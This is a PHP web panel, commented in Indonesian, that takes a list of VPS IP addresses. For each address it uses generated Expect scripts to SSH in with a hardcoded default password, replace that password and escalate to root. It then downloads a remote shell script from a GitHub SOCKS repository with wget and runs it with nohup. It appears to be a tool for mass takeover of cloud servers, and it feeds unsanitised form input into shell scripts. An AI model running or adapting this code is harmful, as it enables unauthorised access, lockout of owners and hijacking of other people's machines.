<?php
// Konfigurasi
$user        = "cloudsigma";
$oldPassword = "Cloud2025";
$newPassword = "Dotaja123@HHHH";

// Ambil IP dari input form
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ips = $_POST['ips'] ?? '';

    if (empty($ips)) {
        die("IP tidak boleh kosong!");
    }

    $ipList = explode(",", $ips);

    foreach ($ipList as $ip) {
        $ip = trim($ip);
        if (empty($ip)) continue;

        echo "<pre>";
        echo "Mengganti sandi VPS $ip...\n";

        // STEP 1: ganti password
        $expect1 = <<<EOD
#!/usr/bin/expect -f
set timeout 20
spawn ssh $user@$ip
expect {
    "yes/no" { send "yes\r"; exp_continue }
    "password:" { send "$oldPassword\r" }
}
expect {
    "Your password has expired*" {
        expect "Current password:" { send "$oldPassword\r" }
        expect "New password:" { send "$newPassword\r" }
        expect "Retype new password:" { send "$newPassword\r" }
    }
    "\\\$ " {
        send "echo -e \\"$oldPassword\\n$newPassword\\n$newPassword\\" | passwd\r"
        expect "\\\$ "
    }
}
expect eof
EOD;

        file_put_contents("/tmp/change_pass.exp", $expect1);
        shell_exec("expect /tmp/change_pass.exp 2>&1");

        echo "Password diganti, login ulang...\n";

        // STEP 2: login ulang + sudo + jalanin script
        $expect2 = <<<EOD
#!/usr/bin/expect -f
set timeout 20
spawn ssh $user@$ip
expect {
    "yes/no" { send "yes\r"; exp_continue }
    "password:" { send "$newPassword\r" }
}
expect "\\\$ "
send "sudo su\r"
expect "password for $user:"
send "$newPassword\r"
expect "# "
send "wget -O gas https://raw.githubusercontent.com/DOT-SUNDA/SOCKS/refs/heads/main/kontol.sh && chmod +x gas && nohup ./gas devnull &\r"
expect "# "
send "exit\r"
expect "\\\$ "
send "exit\r"
expect eof
EOD;

        file_put_contents("/tmp/run_script.exp", $expect2);
        $output = shell_exec("expect /tmp/run_script.exp 2>&1");

        echo htmlspecialchars($output) . "\n";
        echo "Selesai untuk $ip\n";
        echo "</pre>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Panel Ganti Password & Jalankan Script</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        input, textarea { width: 100%; padding: 10px; margin: 5px 0; }
        button { padding: 10px 20px; }
        pre { background: #111; color: #0f0; padding: 10px; border-radius: 8px; }
    </style>
</head>
<body>
    <h2>Panel VPS Executor</h2>
    <form method="post">
        <label>IP VPS (pisahkan dengan koma):</label>
        <textarea name="ips" rows="3" placeholder="Contoh: 49.157.61.51,49.157.61.52"></textarea>
        <button type="submit">Jalankan</button>
    </form>
</body>
</html>
